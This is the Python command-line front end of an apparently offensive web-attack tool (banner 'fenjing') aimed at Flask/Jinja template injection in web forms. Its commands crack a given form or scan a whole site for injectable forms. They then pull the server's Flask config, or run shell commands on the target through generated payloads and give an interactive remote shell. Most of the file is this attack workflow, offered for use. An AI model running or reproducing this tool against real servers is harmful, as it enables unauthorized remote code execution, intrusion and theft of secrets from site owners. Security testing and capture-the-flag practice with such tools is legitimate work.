import logging
from urllib.parse import urlparse
from traceback import print_exc
from typing import Callable, List
from functools import partial

from .form import Form
from .form_cracker import FormCracker
from .full_payload_gen import FullPayloadGen
from .scan_url import yield_form
from .requester import Requester
from .const import *
from .colorize import colored
from .webui import main as webui_main
import click

TITLE = colored("yellow", r"""
    ____             _ _            
   / __/__  ____    (_|_)___  ____ _
  / /_/ _ \/ __ \  / / / __ \/ __ `/
 / __/  __/ / / / / / / / / / /_/ / 
/_/  \___/_/ /_/_/ /_/_/ /_/\__, /  
              /___/        /____/   
""".strip("\n"), bold=True)
LOGGING_FORMAT = "%(levelname)s:[%(name)s] | %(message)s"

logging.basicConfig(
    level=logging.INFO,
    format=LOGGING_FORMAT
)
logger = logging.getLogger("cli")


def cmd_exec(cmd, cracker: FormCracker, field: str, full_payload_gen: FullPayloadGen):
    payload, will_print = full_payload_gen.generate(OS_POPEN_READ, cmd)
    logger.info(f"Submit payload {colored('blue', payload)}")
    if not will_print:
        logger.warning("Payload generator says that this payload {wont_print} command execution result.".format(
            wont_print = colored('red', "won't print")
        ))
    r = cracker.submit(
        {field: payload})
    assert r is not None
    return r.text


def interact(cmd_exec: Callable):
    """根据提供的payload生成方法向用户提供一个交互终端

    Args:
        cmd_exec (Callable): 根据输入的shell命令生成对应的payload
    """
    logger.info(f"Use {colored('cran', 'Ctrl+D', bold=True)} to exit.")
    while True:
        try:
            cmd = input("$>> ")
        except EOFError:
            break
        except KeyboardInterrupt:
            break
        try:
            result = cmd_exec(cmd)
            print(result)
        except Exception:
            print_exc()


@click.group()
def main():
    pass


@main.command()
@click.option("--url", "-u", help="form所在的URL")
@click.option("--action", "-a", default=None, help="form的action，默认为当前路径")
@click.option("--method", "-m", default="POST", help="form的提交方式，默认为POST")
@click.option("--inputs", "-i", help="form的参数，以逗号分隔")
@click.option("--interval", default=0.0, help="每次请求的间隔")
@click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
def get_config(
        url: str,
        action: str,
        method: str,
        inputs: str,
        interval: float,
        user_agent: str):
    """
    攻击指定的表单，并获得目标服务器的flask config
    """
    print(TITLE)
    assert all(param is not None for param in [
               url, inputs]), "Please check your param"
    form = Form(
        action=action or urlparse(url).path,
        method=method,
        inputs=inputs.split(",")
    )
    requester = Requester(
        interval=interval,
        user_agent=user_agent
    )
    cracker = FormCracker(
        url=url,
        form=form,
        requester=requester
    )
    result = cracker.crack()
    if result is None:
        logger.warning("Test form failed...")
        return
    full_payload_gen, field = result
    payload = full_payload_gen.generate(CONFIG)
    r = cracker.submit(
        {field: payload})
    
    print(r.text if r is not None else None)
    logger.warning("Bye!")

@main.command()
@click.option("--url", "-u", help="form所在的URL")
@click.option("--action", "-a", default=None, help="form的action，默认为当前路径")
@click.option("--method", "-m", default="POST", help="form的提交方式，默认为POST")
@click.option("--inputs", "-i", help="form的参数，以逗号分隔")
@click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则成功后进入交互模式")
@click.option("--interval", default=0.0, help="每次请求的间隔")
@click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
def crack(
        url: str,
        action: str,
        method: str,
        inputs: str,
        exec_cmd: str,
        interval: float,
        user_agent: str):
    """
    攻击指定的表单
    """
    print(TITLE)
    assert all(param is not None for param in [
               url, inputs]), "Please check your param"
    form = Form(
        action=action or urlparse(url).path,
        method=method,
        inputs=inputs.split(",")
    )
    requester = Requester(
        interval=interval,
        user_agent=user_agent
    )
    cracker = FormCracker(
        url=url,
        form=form,
        requester=requester
    )
    result = cracker.crack()
    if result is None:
        logger.warning("Test form failed...")
        return
    full_payload_gen, field = result
    cmd_exec_func = partial(cmd_exec, cracker=cracker,
                            field=field, full_payload_gen=full_payload_gen)
    if exec_cmd == "":
        interact(cmd_exec_func)
    else:
        print(cmd_exec_func(exec_cmd))
    logger.warning("Bye!")


@main.command()
@click.option("--url", "-u", help="需要扫描的URL")
@click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则进入交互模式")
@click.option("--interval", default=0.0, help="每次请求的间隔")
@click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
def scan(url, exec_cmd, interval, user_agent):
    """
    扫描指定的网站
    """
    print(TITLE)
    requester = Requester(interval=interval, user_agent=user_agent)
    for page_url, forms in yield_form(requester, url):
        for form in forms:
            cracker = FormCracker(url=page_url, form=form, requester=requester)
            result = cracker.crack()
            if result is None:
                continue
            full_payload_gen, field = result
            cmd_exec_func = partial(cmd_exec, cracker=cracker,
                                    field=field, full_payload_gen=full_payload_gen)
            if exec_cmd == "":
                interact(cmd_exec_func)
            else:
                print(cmd_exec_func(exec_cmd))
            return
    logger.warning("Scan failed...")


@main.command()
@click.option("--host", "-h", default = "127.0.0.1", help="需要监听的host, 默认为127.0.0.1")
@click.option("--port", "-p", default = 11451, help="需要监听的端口, 默认为11451")
def webui(host, port):
    """
    启动webui
    """
    webui_main(host, port)

if __name__ == '__main__':
    main()
